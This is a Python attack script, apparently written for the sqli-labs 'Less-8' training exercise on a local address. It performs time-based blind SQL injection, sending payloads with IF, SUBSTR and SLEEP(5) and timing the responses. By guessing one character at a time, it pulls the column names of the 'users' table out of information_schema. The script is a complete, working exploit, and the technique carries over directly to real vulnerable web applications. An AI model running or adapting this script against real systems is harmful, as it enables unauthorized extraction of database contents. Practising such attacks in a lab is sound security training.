#!/usr/bin/python3

import requests, sys, time, signal

url="http://192.168.0.101/Less-8/?id=1"

result=''
s=r'0123456789abcdefghijklmnopqrstuvwxyz'
#s=r'abcdefghijklmnopqrst'

def check(payload):
	url_new=url+payload
	time_start=time.time()
	content=requests.get(url_new)
	time_end=time.time()

	if time_end-time_start > 5:
		return 1


def def_handler(kay, frame):
	print("\n\n[!] Exiting ...")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)



for j in range(1,6):
	for i in range(1, 100):
		for c in s:
			payload="' and if(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit %d,1),%d,1)='%c', sleep(5),1)-- -" %(j,i,c)

			if check(payload):
				result+=c
				print(result)
				break

#	print("\n[*] Tabla [%d]: %s") %(j,result)
	print("\n[*] Columna [{}]: {}".format(j, result))
	result=''
